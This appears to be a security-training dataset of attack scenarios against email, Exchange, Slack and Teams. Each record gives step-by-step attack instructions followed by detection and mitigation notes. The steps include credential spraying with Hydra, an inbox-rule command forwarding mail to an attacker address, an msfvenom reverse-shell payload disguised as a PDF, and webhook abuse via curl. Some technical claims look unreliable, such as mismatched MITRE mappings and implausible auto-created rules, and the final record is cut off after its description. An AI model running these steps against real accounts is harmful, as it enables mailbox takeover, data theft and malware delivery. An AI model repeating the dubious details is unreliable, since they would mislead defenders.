Title: Microsoft Exchange Password Spray via RPC over HTTP
Scenario Description: Attacker targets Exchange RPC login endpoint using a known list of employees and predictable password formats.
Attack Steps: Step 1: Confirm Exchange server is accessible externally (e.g., outlook.domain.com).Step 2: Confirm RPC over HTTP or EWS endpoint is active (used by Outlook clients).Step 3: Use Burp Suite to study a legitimate login attempt from Outlook.Step 4: Build a username list from employee naming convention (e.g., firstname.lastname@domain.com).Step 5: Use ruler or hydra to spray passwords across accounts.Step 6: Once a valid credential is found, use Outlook or Ruler to login.Step 7: Explore mailbox, download attachments, calendar invites.Step 8: Create a new rule to silently forward or delete emails matching specific keywords (e.g., “invoice”).
Vulnerability: Legacy protocol, no MFA for Outlook
Impact: Silent takeover, financial theft, insider spying
Detection Method: OWA logs show failed RPC logins
Solution: Modern auth enforcement, email rules monitoring

Title: SMTP Packet Capture & Replay
Scenario Description: Attacker captures SMTP packets using a network sniffer and replays them to impersonate a user and resend sensitive emails.
Attack Steps: Step 1: Connect both sender and recipient email clients to the same local Wi-Fi network.Step 2: Attacker uses tcpdump or Wireshark to sniff port 25 traffic.Step 3: Filters out SMTP messages using filter tcp.port == 25.Step 4: Identifies an email with login and message data.Step 5: Extracts full SMTP conversation (EHLO, AUTH, MAIL FROM, RCPT TO, DATA).Step 6: Attacker uses hping3 or raw sockets to replay the captured email.Step 7: Recipient receives a duplicate email that looks like it came from the sender.
MITRE Technique: T1040 (Network Sniffing), T1071.003 (Application Layer Protocol: Email)
Detection Method: Monitor duplicate email IDs, analyze headers
Solution: Use STARTTLS, enforce secure SMTP with authentication

Title: Replay Attack Using Captured SMTP Credentials
Scenario Description: SMTP credentials captured from earlier sniffed traffic are used to resend previous emails or spam.
Attack Steps: Step 1: Attacker captures credentials via packet sniffing or MITM attack.Step 2: Opens a raw SMTP session using Telnet (telnet smtp.mailserver.com 25).Step 3: Authenticates using captured AUTH LOGIN base64-encoded credentials.Step 4: Sends a new or replayed email (MAIL FROM, RCPT TO, DATA).Step 5: Reconstructs and resends original email body with same headers.Step 6: Spam or confidential message appears valid to recipient.Step 7: Tracks if mail is delivered successfully or flagged as duplicate.
Detection Method: Email log monitoring, header analysis
Solution: Use TLS encryption, disable plaintext auth

Title: Man-in-the-Middle Replay via Rogue Wi-Fi
Scenario Description: Attacker creates a rogue access point, intercepts SMTP traffic, and resends it with altered content.
Attack Steps: Step 1: Attacker creates a rogue Wi-Fi AP (SSID: “Free_WiFi”) using hostapd.Step 2: Enables IP forwarding and installs mitmproxy or Bettercap.Step 3: Waits for a user to connect and send an email over port 25 or 587.Step 4: Captures SMTP stream in plaintext, including message data.Step 5: Modifies message body (e.g., changes account number).Step 6: Replays the modified message using same SMTP headers.Step 7: Recipient receives a tampered message appearing valid.
Vulnerability: No SSL, Rogue AP, Unencrypted SMTP
MITRE Technique: T1557 (MITM), T1110 (Credential Access), T1565.002 (Email Content Modification)
Detection Method: Detect rogue SSIDs, check DKIM/headers
Solution: Use TLS/SSL SMTP, implement SPF/DKIM

Title: Message Replay via Internal Email Server Logs
Scenario Description: Insider replays previously sent emails by accessing raw SMTP logs on internal servers.
Tools Used: Linux shell, mail logs, Python SMTP Lib
Attack Steps: Step 1: Insider logs into internal mail server with admin access.Step 2: Navigates to /var/log/mail.log or /var/log/maillog.Step 3: Locates full SMTP session of a previous message.Step 4: Copies sender, recipient, message-ID, and body.Step 5: Uses Python’s smtplib to reconstruct and resend email.Step 6: Edits timestamp or message content to alter context.Step 7: Email gets delivered again with similar headers, unnoticed.
Detection Method: Enable alerting for duplicate headers
Solution: Restrict log access, monitor insider behavior

Title: SMTP Replay via Delayed Delivery Exploit
Scenario Description: Attacker crafts SMTP messages with delayed delivery and re-sends them repeatedly to flood or confuse recipient.
Attack Steps: Step 1: Attacker crafts a valid email and sets Delivery-Date header in future.Step 2: Sends message to recipient using SMTP client or script.Step 3: Modifies message headers to appear unique (change message ID slightly).Step 4: Repeats sending similar messages with slightly changed content.Step 5: Recipient receives same message at different times, appears legitimate.Step 6: Confusion is created as to which message is official.Step 7: Messages may bypass spam filters due to unique IDs.
Detection Method: Compare timestamps & headers
Solution: Block repeated delivery attempts via filters

Title: SMTP Replay via Compromised Mail Archive
Scenario Description: Attacker gains access to a backup or archive of sent emails, extracts original messages, and replays them via SMTP to impersonate user.
Tools Used: Thunderbird, Python smtplib, Outlook PST Viewer
Attack Steps: Step 1: Attacker gains access to a PST file or archived sent mails folder from a backup drive or exported file.Step 2: Extracts full message headers and body using a mail client or PST reader.Step 3: Observes original From, To, and Date headers.Step 4: Reconstructs the email using Python’s smtplib, replicating headers to match original.Step 5: Connects to SMTP server using valid or anonymous relay (if open).Step 6: Sends email with original content but altered date to confuse recipients.Step 7: Victim receives email appearing to be an authentic historical message.
Detection Method: Unusual timestamp patterns
Solution: Encrypt backups, restrict mail archive access

Title: Intercepted SMTP via Public Proxy
Scenario Description: Email client misconfigured to use a public SMTP relay; attacker uses proxy logs to capture and replay messages.
Attack Steps: Step 1: Victim uses an insecure SMTP proxy (e.g., open relay from old config).Step 2: Attacker monitors or logs traffic on the proxy SMTP server.Step 3: Captures full message body and headers in logs.Step 4: Logs include sender, recipient, subject, and body.Step 5: Attacker copies original message and modifies slightly (e.g., date, footer).Step 6: Sends the replayed message through same or another SMTP proxy.Step 7: Receiver receives identical message; attacker avoids detection.
Detection Method: Analyze open relay logs
Solution: Avoid public proxies, use authenticated SMTP only

Title: SMTP Replay through Internal Compromised Router
Scenario Description: A compromised router inside the network captures SMTP traffic and enables replay of confidential emails.
Attack Steps: Step 1: Attacker compromises an internal router with OpenWRT firmware.Step 2: Installs tcpdump to capture all outgoing port 25/587 traffic.Step 3: Filters for SMTP commands (EHLO, AUTH, MAIL FROM, etc.).Step 4: Extracts full raw email with headers and message content.Step 5: Saves original message in text file.Step 6: Opens a socket to the mail server using netcat.Step 7: Replays captured SMTP session to resend email undetected.
Detection Method: Monitor router behavior
Solution: Harden routers, restrict packet capture

Title: SMTP Replay via DNS Hijack
Scenario Description: Attacker hijacks victim’s DNS, redirects SMTP connection to a rogue mail server to intercept and replay messages.
Attack Steps: Step 1: Attacker runs dnsspoof to redirect smtp.mail.com to their IP.Step 2: Victim email client tries to send mail, connects to rogue SMTP.Step 3: Attacker saves full message content and metadata.Step 4: Original message is either forwarded or discarded silently.Step 5: Later, attacker connects to real SMTP server and replays message with spoofed headers.Step 6: Message looks identical to original but includes attacker’s payload/link.Step 7: Recipient receives forged message; DNS attack remains invisible.
Detection Method: Unusual routing or server IPs
Solution: Use DNSSEC, validate SMTP certificates

Title: SMTP Replay via Credential Stuffing
Scenario Description: Using stolen credentials from breaches, attacker logs into real SMTP servers and resends prior emails.
Attack Steps: Step 1: Attacker collects leaked email-password pairs from breach databases.Step 2: Uses Hydra to verify credentials against real SMTP service (e.g., smtp.office365.com).Step 3: Upon successful login, uses SMTP client to read Sent messages or drafts (if supported).Step 4: Reconstructs previous email and updates timestamp.Step 5: Sends message to recipient again with identical body and subject.Step 6: Exploits trust of recipient in repeated communication.Step 7: Adds link or malicious content in replayed version if needed.
Detection Method: Detect login from new geolocation
Solution: Use MFA, monitor failed SMTP auth attempts

Title: SMTP Replay via Client-Side Script Injection
Scenario Description: Attacker exploits vulnerable webmail client to inject a script that auto-resends specific messages.
Attack Steps: Step 1: Victim logs into webmail interface vulnerable to XSS.Step 2: Attacker sends a malicious email containing embedded JavaScript.Step 3: Script runs when email is opened and copies message content.Step 4: Auto-triggers client-side SMTP request or uses hidden form to resend the message.Step 5: Message is resent to attacker-controlled address or target recipient.Step 6: Victim is unaware replay occurred as email was sent silently.Step 7: Attacker harvests message history for phishing.
Detection Method: CSP headers, check outbox anomalies
Solution: Patch XSS, enable CSP and sandbox iframes

Title: SMTP Replay via MX Record Poisoning
Scenario Description: Attacker poisons DNS MX records to route outgoing email through rogue SMTP server.
Attack Steps: Step 1: Attacker gains access to local DNS or corrupts upstream DNS cache.Step 2: Changes MX record for domain example.com to attacker’s mail server IP.Step 3: Victim’s mail client sends SMTP message to fake mail server.Step 4: Attacker captures message and logs full body.Step 5: Either forwards message to real server or stores for future replay.Step 6: Attacker resends message at a later time with altered headers.Step 7: Original recipient gets tampered message.
Detection Method: Verify MX integrity, DNS monitoring
Solution: Secure DNS using DNSSEC and split-DNS

Title: SMTP Replay via Email Forwarding Rule Abuse
Scenario Description: Attacker sets up forwarding rules to intercept and later resend confidential emails.
Attack Steps: Step 1: Attacker gains access to victim’s mailbox (via phishing or creds).Step 2: Navigates to webmail settings and adds a forwarding rule to external address.Step 3: Waits until victim sends a sensitive message.Step 4: Forwarded copy arrives in attacker’s inbox.Step 5: Attacker modifies it and sends again using SMTP server or anonymous relay.Step 6: Message appears like original one.Step 7: Used for impersonation or information leakage.
Detection Method: Check forwarding rules
Solution: Restrict forwarding externally, alert admins

Title: SMTP Replay via Shared Mailbox Abuse
Scenario Description: Legitimate users with access to a shared mailbox use its sent items to replay or modify old emails.
Attack Steps: Step 1: Attacker has access to shared mailbox (internal role-based access).Step 2: Opens sent items folder and selects previously sent messages.Step 3: Copies entire email body and headers.Step 4: Modifies subject slightly and resends using same mailbox.Step 5: New message looks authentic as it comes from trusted source.Step 6: May include malicious link/file.Step 7: Victim opens it thinking it’s part of ongoing thread.
Detection Method: Monitor sent items activity
Solution: Audit mailbox access logs

Title: Replay via SMTP Open Relay Abuse
Scenario Description: Attacker uses misconfigured open SMTP relay to send replayed messages without auth.
Tools Used: Open Relay SMTP Daemon, Python SMTP Script
Attack Steps: Step 1: Attacker scans for open SMTP relays using nmap or smtp-user-enum.Step 2: Identifies server that accepts mail from unauthenticated sources.Step 3: Crafts a spoofed email matching previous legitimate one.Step 4: Sends mail via the open relay to victim.Step 5: Message looks valid and often bypasses filters.Step 6: Repeats to send the same message to multiple targets.Step 7: Message appears as if from the real domain.
Detection Method: Detect open relays on network
Solution: Block relays, enable SMTP auth

Title: Replay via Outbox Sync Hijack
Scenario Description: Attacker gains access to an email client’s unsent or queued messages and replays them by syncing to a forged SMTP endpoint.
Tools Used: Thunderbird, Fake SMTP Server (e.g., MailHog), Proxy Tool
Attack Steps: Step 1: Attacker gains access to the victim’s device or email client folder (Outbox).Step 2: Extracts any queued emails not yet sent (e.g., due to network disconnection).Step 3: Sets up a local fake SMTP server using tools like MailHog.Step 4: Configures victim's email client to sync with the fake SMTP server.Step 5: SMTP session begins and attacker captures all outbound message data.Step 6: Attacker resends the queued messages manually or modifies and sends them to new recipients.Step 7: Victim may never know original drafts were sent.
Detection Method: Compare email client Outbox vs Sent Items
Solution: Encrypt drafts, restrict local access

Title: Replay via SMTP “Resend” Function Abuse
Scenario Description: Some email clients have a “Resend” or “Send Again” function that can be exploited to replicate old messages with minimal effort.
Attack Steps: Step 1: Attacker gains access to a logged-in email account (internal actor or session hijack).Step 2: Opens Sent Items and selects any previously sent message.Step 3: Uses the built-in “Resend This Message” or “Send Again” option.Step 4: Message body, headers, and recipients are pre-filled by the client.Step 5: Attacker edits or sends the exact same message without triggering alerts.Step 6: This method avoids composing new emails and looks legitimate.Step 7: Used to phish or impersonate previous conversations.
Detection Method: Monitor repeat subjects with exact body match
Solution: Log client-level resend actions

Title: Replay via SMTP Logging on Misconfigured Server
Scenario Description: SMTP servers with verbose logging enabled store entire emails in plaintext, which an attacker with access can replay.
Attack Steps: Step 1: Attacker accesses mail server logs due to misconfiguration or insider access.Step 2: Views verbose logs under /var/log/mail.log or /var/log/exim/main.log.Step 3: Finds full SMTP transaction: sender, receiver, subject, and body.Step 4: Copies data including MAIL FROM, RCPT TO, and message DATA.Step 5: Uses Python smtplib or Telnet to replay the SMTP transaction.Step 6: Message is resent to original or alternate recipient.Step 7: Exploits server’s verbose logging to clone communication.
Detection Method: Disable verbose mail logs
Solution: Mask or truncate logs; audit access

Title: Replay Attack via SMTP Queue Tampering
Scenario Description: Attacker tampers with the mail queue directory on a Linux-based SMTP server to reintroduce previously sent messages.
Attack Steps: Step 1: Attacker gains root or mail admin access to a Linux mail server (e.g., via privilege escalation).Step 2: Navigates to /var/spool/postfix/deferred/ or /active/ to find queued message files.Step 3: Copies message files to another location.Step 4: Replaces timestamp or metadata.Step 5: Moves the modified message back into the active queue folder.Step 6: Postfix reprocesses the message and delivers it again.Step 7: Victim receives a replayed message that appears freshly sent.
Detection Method: Monitor queue activity, alert on resends
Solution: Restrict queue file permissions

Title: Message Replay via SMTP-to-SMTP Tunneling
Scenario Description: Attacker uses SMTP tunnels between compromised servers to replay messages across internal and external boundaries.
Attack Steps: Step 1: Attacker compromises two machines: one internal, one external.Step 2: Sets up a tunnel using socat or stunnel from internal SMTP to external server port 25.Step 3: Configures fake SMTP server on external endpoint to log all messages.Step 4: Forwards messages from internal server via this tunnel.Step 5: Attacker logs SMTP content in transit.Step 6: Later, attacker sends logged messages using their own SMTP client.Step 7: Replay occurs between internal-external boundary, bypassing some filters.
Detection Method: Inspect unusual SMTP traffic ports
Solution: Disallow outbound SMTP tunnels

Title: Hidden Auto-Forward Rule to Attacker Email
Scenario Description: Attacker gains access to a user's mailbox and silently adds an auto-forward rule to send a copy of every received email to their own email address.
Tools Used: Outlook Web Access, PowerShell (for admin sim), Attacker Email (e.g., Gmail)
Attack Steps: Step 1: Attacker logs in to victim's mailbox (assume credentials already stolen via phishing).Step 2: Navigate to Outlook Web Access > Settings > Mail > Rules.Step 3: Create a new rule: "If message received, forward to attacker@example.com".Step 4: Enable the rule and ensure it’s named innocuously like “Scan Inbox” or “Important Filter”.Step 5: Log out; all future emails to the victim are silently forwarded.
Impact: Sensitive data leaks, intellectual property theft
Detection Method: Monitor rules via PowerShell or security tools for external forwarding
Solution: Disable external auto-forwarding and alert on rule creation

Title: Auto-Forward Triggered by Specific Keywords
Scenario Description: Auto-forwarding rule filters emails based on sensitive terms like “invoice”, “bank”, “password” and sends only those to attacker’s inbox.
Attack Steps: Step 1: Attacker gets access to user's email client (local or via stolen credentials).Step 2: Opens Rules in Outlook desktop app.Step 3: Creates a rule: "If subject/body contains 'bank', 'invoice', 'credentials', then forward to attacker@evilmail.com".Step 4: Sets rule to stop processing further rules for stealth.Step 5: All emails matching keywords are silently forwarded.
Vulnerability: Misused client-side rules for keyword-triggered forwarding
Impact: Confidential financial info leaked to attacker
Detection Method: Log and audit Outlook rules regularly
Solution: Block user-level forwarding via group policy

Title: Rule Injection via Compromised Admin Account
Scenario Description: Attacker compromises Exchange Admin account and injects auto-forward rules into multiple mailboxes.
Attack Steps: Step 1: Attacker logs into Exchange Admin account.Step 2: Uses PowerShell:Set-InboxRule -Mailbox john@company.com -Name "MonitorRule" -ForwardTo attacker@example.com -FromScope ExternalStep 3: Repeats for multiple users silently.Step 4: Rules forward copies of emails externally to attacker.Step 5: Attacker monitors email traffic of multiple employees.
MITRE Technique: T1098.004 (Account Manipulation: Exchange Email Delegate Permissions)
Detection Method: Audit Exchange rules and monitor command logs
Solution: Enforce MFA for admin accounts and monitor rule creation

Title: Phishing Page Adds Auto-Forward Rule
Scenario Description: A phishing site mimics the webmail login, and once credentials are entered, it logs in and sets a hidden forwarding rule to an attacker email.
Tools Used: Fake Webmail Login Page (HTML), Backend Script (Python/PHP)
Attack Steps: Step 1: Attacker creates a phishing page identical to company’s webmail login.Step 2: Victim enters credentials; backend logs the credentials.Step 3: Backend script logs into the real webmail using those credentials.Step 4: Auto-creates a rule: “Forward all incoming email to attacker@protonmail.com”.Step 5: Victim continues using their email unaware, while attacker silently receives every message.
Vulnerability: Credential harvesting with automatic rule setup
Impact: Undetected access to all email communications
Detection Method: Monitor for logins from unusual IPs, forward rule creation
Solution: Use anti-phishing awareness + disable external forwarding

Title: Browser Extension Abuse to Inject Forwarding Rule
Scenario Description: A malicious browser extension installed on a user's system intercepts Outlook Web interactions and silently inserts a forwarding rule.
Tools Used: Malicious Chrome Extension (Custom), Outlook Web Access
Attack Steps: Step 1: Attacker sends user a malicious Chrome extension disguised as a productivity tool.Step 2: User installs it.Step 3: Extension monitors for Outlook Web sessions.Step 4: When Outlook Web is open, it injects a hidden API call to set a rule: forward all incoming mail to attacker@spyhub.org.Step 5: Rule created silently without alerting user.
Vulnerability: Browser-based session hijack to inject rules
Impact: Covert email exfiltration with no login trace
Detection Method: Monitor browser extensions and email rules via APIs
Solution: Block unauthorized browser extensions via policy

Title: Auto-Forward via Mobile Email Client Settings
Scenario Description: Attacker gains access to the victim’s mobile email app and configures it to forward or redirect emails to an external address, exploiting weak device controls.
Tools Used: Gmail App, iOS Mail, Attacker Email
Attack Steps: Step 1: Attacker uses previously obtained credentials to log into the victim’s email via Gmail mobile app.Step 2: Goes to Settings > Account > Forwarding/POP/IMAP.Step 3: Adds a new forwarding address such as attacker@maildrop.cc.Step 4: Confirms via verification email (already accessible via compromised account).Step 5: Enables "Forward a copy of incoming mail" silently.Step 6: Logs out; the victim receives all emails as normal, while copies go to attacker’s inbox.
Vulnerability: Weak device/app configuration allows rule setup
Impact: Email exfiltration via trusted mobile client
Detection Method: Monitor device email settings changes
Solution: Use MDM to control app behavior, disable mobile forwarding

Title: Outlook Add-in Hijack to Configure Auto-Forward
Scenario Description: A compromised Outlook add-in is used to silently configure or modify forwarding rules from within the user's desktop client.
Attack Steps: Step 1: Attacker sends the user a seemingly useful Outlook add-in (e.g., PDF tool).Step 2: User installs it manually.Step 3: Add-in runs under Outlook's permissions and uses scripting API to insert a rule.Step 4: Rule created: if email received from anyone, forward to attacker@xmail.io.Step 5: Add-in also hides rule from the visible list using obfuscation.Step 6: All emails silently forwarded while user sees nothing unusual.
Vulnerability: Exploitable API permissions in Outlook add-ins
Detection Method: Check registry and COM add-ins, monitor Outlook rules
Solution: Restrict installation of untrusted add-ins via GPO

Title: Insider Abuses Delegate Access to Set Forwarding
Scenario Description: A rogue internal employee with mailbox delegate rights abuses their access to configure a forwarding rule to an external third-party.
Attack Steps: Step 1: Insider has delegate permissions to a manager’s mailbox.Step 2: Opens Outlook or EAC to manage rules for the delegated account.Step 3: Creates a rule: “Forward all incoming emails to insiderfriend@protonmail.com”.Step 4: Names rule "Sync with CRM" to avoid suspicion.Step 5: Monitors incoming messages silently for months.
Detection Method: Log and alert external rules created by delegates
Solution: Enforce approval-based delegate permissions

Title: Google Workspace Filter Rule Forwarding Abuse
Scenario Description: A malicious actor uses Gmail filter settings in Google Workspace to forward filtered messages externally without needing full forwarding enabled.
Attack Steps: Step 1: Attacker logs into compromised Gmail account.Step 2: Goes to Settings > Filters and Blocked Addresses.Step 3: Creates a new filter: “If subject contains ‘password’ or ‘invoice’, then forward to hacker@gmail.com”.Step 4: Bypasses account-level forwarding restriction policies.Step 5: Only filtered, sensitive content is silently exfiltrated.
Detection Method: Audit filters and email forwarding policies
Solution: Disallow forwarding using DLP in Google Admin

Title: SaaS OAuth App Abuses Mail API to Forward Emails
Scenario Description: Attacker tricks user into granting OAuth access to a SaaS app which silently forwards emails using Gmail/Outlook APIs.
Tools Used: Fake SaaS App, Gmail API, Outlook API
Attack Steps: Step 1: Attacker sends user a link to a helpful SaaS tool (e.g., calendar sync, document signer).Step 2: User grants OAuth access using Google or Microsoft SSO.Step 3: Attacker’s backend uses granted token to access mailbox via API.Step 4: Sends each new email to attacker via their own API.Step 5: Since it's done via OAuth, no rule is visible in UI.Step 6: Data exfiltration continues invisibly via background app.
Detection Method: Monitor OAuth token grants and scopes
Solution: Enforce OAuth app allowlisting and revocation

Title: DNS MX Record Hijack to Divert Emails
Scenario Description: Attacker gains access to DNS zone of a domain and modifies MX records to reroute emails via an attacker-controlled mail server.
Attack Steps: Step 1: Attacker compromises DNS admin credentials or DNS host.Step 2: Changes domain’s MX records to point to their own mail server.Step 3: Incoming emails are received by attacker’s server first.Step 4: Emails are then forwarded to the real mail server to avoid suspicion.Step 5: Attacker stores a copy of every email passing through.
Impact: Full email interception for all users
Detection Method: Monitor MX changes, use DNS change alerting
Solution: Use DNSSEC and restrict registrar access

Title: Auto-Forward Rule Triggered via Calendar Invite
Scenario Description: A malicious calendar invite is sent that, when opened, triggers a rule configured to forward invite response notifications externally.
Attack Steps: Step 1: Attacker crafts a malicious calendar invite.Step 2: Victim opens and adds it to calendar.Step 3: Rule automatically created via sync: “Forward invite responses to attacker@evil.org”.Step 4: Attacker uses this to map user’s meetings, locations, contacts.Step 5: Attack appears legitimate as it uses calendar feature.
Vulnerability: Weak integration between calendar & mail rules
Impact: Mapping of user behavior, meeting data leaks
Detection Method: Audit calendar rule behavior, review sync policies
Solution: Sanitize and validate ICS file imports

Title: Compromised Shared Mailbox Used as Pivot
Scenario Description: Attacker compromises a shared mailbox and uses it to forward internal emails to an external attacker address without detection.
Attack Steps: Step 1: Attacker logs into shared mailbox (e.g., hr@company.com) via stolen credentials.Step 2: Navigates to mailbox rules section.Step 3: Creates a rule: “Forward all new mail to attacker@onionmail.org”.Step 4: Since shared mailboxes are monitored less, it goes undetected.Step 5: Internal communications among HR, payroll, and candidates are leaked.
Vulnerability: Lack of auditing on shared mailbox behavior
Impact: Sensitive HR or finance info leaks
Detection Method: Apply same rules to shared mailbox as user mailboxes
Solution: Monitor shared mailbox rules and activity

Title: Forward Rule as a Payload in Malware Dropper
Scenario Description: Malware installed on a system creates an Outlook rule programmatically as part of persistence and data exfiltration.
Attack Steps: Step 1: User executes malware disguised as a PDF reader installer.Step 2: Malware uses VBScript to open Outlook COM interface.Step 3: Creates a rule in Outlook: “Forward all emails with attachments to attacker@shady.biz”.Step 4: Rule executes silently as Outlook runs.Step 5: Malware ensures rule is recreated on reboot.
Detection Method: Monitor rule creation and malware behavior
Solution: Block Outlook COM access and monitor registry

Title: Exploiting Auto-Forward Rule in External Collaboration
Scenario Description: A vendor employee has auto-forwarding enabled, and attacker compromises vendor to collect internal company communications.
Attack Steps: Step 1: Attacker compromises email account of a vendor (e.g., john@partner.com).Step 2: Observes auto-forwarding rule to john.personal@gmail.com already in place.Step 3: Updates the rule to forward a copy to attacker@tutanota.com.Step 4: All inter-org communications shared via email (contracts, invoices, credentials) are leaked.Step 5: The primary user sees no change.
Detection Method: Monitor partner DLP policies, audit cross-domain forwards
Solution: Enforce strict email forwarding policies on third parties

Title: Auto-Forward via Legacy IMAP Client Rule Injection
Scenario Description: Attacker logs in using legacy IMAP client and exploits outdated rule mechanisms to trigger email forwarding, bypassing modern policy checks.
Tools Used: Thunderbird Email Client, Attacker IMAP Account
Attack Steps: Step 1: Attacker uses stolen credentials to configure the victim’s account in Thunderbird (an older IMAP-based email client).Step 2: Sets a local message filter: “For all incoming emails, forward to attacker@evilmail.org”.Step 3: Thunderbird pushes changes to the IMAP server, and due to legacy sync, it starts forwarding emails.Step 4: User continues using official client (e.g., Outlook) without noticing any change.Step 5: Emails are forwarded from the client level, bypassing server-level policy enforcement.
Detection Method: Block legacy IMAP usage; log client rules
Solution: Enforce modern clients and disable legacy protocols

Title: Email Forwarding Using Google Apps Script
Scenario Description: Attacker uses Google Apps Script with authorized access to create a background script that silently forwards selected emails from Gmail.
Attack Steps: Step 1: Attacker tricks user into installing a Google Workspace Add-on (script).Step 2: The script is granted permission to read and forward Gmail messages.Step 3: Script runs periodically to check for emails with sensitive keywords (e.g., “password”, “invoice”).Step 4: Matched emails are copied and sent via GmailApp.sendEmail() to attacker’s address.Step 5: Script is scheduled to run invisibly in background every hour.
Vulnerability: Abused scripting access and misconfigured scopes
MITRE Technique: T1059.005 (Command and Scripting Interpreter: Visual Basic) + T1114.003
Detection Method: Monitor Apps Script activity logs and OAuth scopes
Solution: Restrict Google scripting permissions via admin panel

Title: Compromised Mailbox Rule Used for Credential Harvesting
Scenario Description: Attacker sets an auto-forwarding rule targeting emails containing 2FA/OTP codes or password reset links, enabling real-time account hijack.
Attack Steps: Step 1: Attacker accesses victim’s account via phishing.Step 2: Navigates to Mail > Rules and creates: “If subject contains ‘verification code’ or ‘OTP’, forward to attacker@fastmail.com”.Step 3: Attacker uses this to intercept 2FA/OTP messages when trying to reset passwords for other platforms.Step 4: Quickly uses intercepted codes to hijack connected accounts (bank, cloud, etc.).Step 5: Deletes forwarded messages to hide traces.
Detection Method: Look for rules targeting keywords like “OTP”
Solution: Alert on forwarding rules with sensitive keywords

Title: Email Forwarding via Linked Cloud Storage Rules
Scenario Description: A compromised Microsoft 365 account is configured to auto-forward attachments to OneDrive/Dropbox for silent external access.
Tools Used: Outlook, Microsoft Power Automate, Dropbox API
Attack Steps: Step 1: Attacker logs into victim’s Outlook and accesses Power Automate.Step 2: Creates a flow: “When new email with attachment arrives, save file to attacker’s Dropbox folder”.Step 3: Configures Dropbox link with shared access.Step 4: Emails with attachments are now uploaded silently in background.Step 5: Attacker collects files from Dropbox without needing mailbox access again.
Vulnerability: External app (Power Automate) abused for email forwarding
Impact: Covert file exfiltration via trusted apps
Detection Method: Monitor cloud flow activity logs
Solution: Restrict automation flows to approved apps only

Title: Use of API Tokens to Forward Internal HR Emails
Scenario Description: Attacker compromises HR mailbox and uses an internal HR system API to programmatically forward received email content to attacker’s address.
Tools Used: Internal HR Portal, API Client (Postman), Attacker Email
Attack Steps: Step 1: Attacker compromises HR email via phishing.Step 2: Uses credentials to access integrated HR system that has email API access.Step 3: Uses system’s built-in API (e.g., /email/forward or /email/read) with session token.Step 4: Every HR-related email content is extracted and sent via API to attacker@anonaddy.com.Step 5: Emails are forwarded through the app backend and not visible in inbox rules.
Detection Method: Monitor HR app audit logs, validate email APIs
Solution: Use access control and API monitoring with DLP

Title: Slack Token Hijack via Public Repos
Scenario Description: Attacker finds Slack tokens exposed in public GitHub repos and uses them to access private channels
Attack Steps: Step 1: Search GitHub using Google dork: site:github.com slack.com token or slack_token.Step 2: Identify repositories that have hardcoded tokens.Step 3: Copy the Slack token and use Postman or curl to validate via Slack API (auth.test).Step 4: Use conversations.list API to fetch all channels.Step 5: Extract sensitive messages or files using conversations.history.Step 6: Document all accessed content for simulation.
Detection Method: Monitor for unusual API calls, audit code repos
Solution: Rotate leaked tokens, enforce token scanning pre-commit hooks

Title: Teams Phishing via Fake Invite
Scenario Description: Attacker sends fake Microsoft Teams invite link that redirects to a phishing login page
Attack Steps: Step 1: Create a fake Microsoft Teams meeting page clone using HTTrack.Step 2: Use Gophish to craft an email: “You've been invited to a confidential Teams call.”Step 3: Embed the phishing page link as the “Join Meeting” button.Step 4: Host the phishing page on a domain like teams-web[.]net.Step 5: Send the phishing email to the target.Step 6: Log credentials input into the fake login page.
Detection Method: Monitor email click behavior, email header inspection
Solution: User awareness training, email filtering, domain impersonation detection

Title: Slack Webhook Exploitation
Scenario Description: Attacker misuses exposed Slack incoming webhooks to send spam/malicious messages in channels
Attack Steps: Step 1: Identify Slack webhook URLs leaked on sites using Google dork: inurl:hooks.slack.com.Step 2: Test the webhook using curl:curl -X POST -H 'Content-type: application/json' --data '{"text":"Hello from attacker"}' https://hooks.slack.com/services/XXX/XXX/XXXStep 3: Send payloads like phishing links or malicious file links.Step 4: Flood channels with spam or redirect users to malware sites.Step 5: Record behavior and responses for simulation.
Detection Method: Monitor external IPs using webhooks, alert on bulk messages
Solution: Rotate webhook URLs, restrict incoming IPs

Title: Teams Tab Injection (Malicious Tabs)
Scenario Description: Attacker adds a malicious app/tab to a Teams channel that redirects users to fake login or exploit kits
Tools Used: MS Teams Developer Tools, Malicious Web App
Attack Steps: Step 1: Create a Microsoft Teams app manifest with a malicious URL embedded in the tab section.Step 2: Register the app in Teams Developer Portal.Step 3: Share the app package with a collaborator or upload to Teams.Step 4: Add the app as a tab in a shared channel.Step 5: Users click the tab, landing on a fake page or malicious script.Step 6: Simulate user data theft or malware execution.
Detection Method: Monitor for new tab URLs, domain analysis
Solution: Restrict custom app installation, review tab URLs

Title: Slack File Upload Abuse (Malware Delivery)
Scenario Description: Attacker uploads disguised malware to public Slack channels and lures users into downloading
Attack Steps: Step 1: Generate a malware payload disguised as a PDF using MSFVenom:msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe > report.pdf.exeStep 2: Rename the file to “Q2_Sales_Report.pdf.exe” and compress in ZIP.Step 3: Upload to Slack in a public or semi-public channel.Step 4: Add message like “Please review this before the 2 PM call.”Step 5: On click and execution by user, simulate connection to C2.Step 6: Log timestamp and user action for educational tracking.
Detection Method: Slack DLP, file hash comparison, anti-virus flag
Solution: Restrict executable uploads, use AV integrations

Title: Slack OAuth App Abuse
Scenario Description: Attacker builds a malicious Slack App that tricks users into granting excessive permissions, then harvests sensitive channel info
Tools Used: Slack Developer Portal, Ngrok, NodeJS App
Attack Steps: Step 1: Go to Slack API site and create a new App with OAuth scopes like channels:read, files:read, chat:write.Step 2: Deploy app backend with Ngrok to expose localhost for redirection.Step 3: Send an invitation to users to “Authorize this bot to get productivity insights.”Step 4: Once a user clicks, OAuth flow completes and attacker receives a permanent access token.Step 5: Use the token to silently extract channel messages, user details, and shared files.Step 6: Store the extracted data for simulation results.
Detection Method: Monitor third-party app tokens and access logs
Solution: Restrict app installations, review OAuth scopes

Title: Microsoft Teams GIF Domain Exploit
Scenario Description: Attacker crafts a GIF hosted on an external domain to capture authentication tokens when rendered in Teams
Tools Used: Custom Image Host, Burp Suite, Python HTTP Server
Attack Steps: Step 1: Set up a web server to host a crafted GIF file with malicious payload.Step 2: Modify the Set-Cookie header in HTTP response to mimic Teams auth token behavior (for simulation only).Step 3: Share the GIF link in a Teams chat: “Check this out!”Step 4: When user views the GIF, their Teams client auto-loads it.Step 5: Simulate token or cookie grab via your server logs.Step 6: Demonstrate how passive viewing can leak tokens.
Detection Method: Monitor external image requests from chat
Solution: Block external media preview, sanitize embeds

Title: Slack Workspace Enumeration via Join Links
Scenario Description: Attacker uses public Slack invite links to enumerate organizations, usernames, and member lists
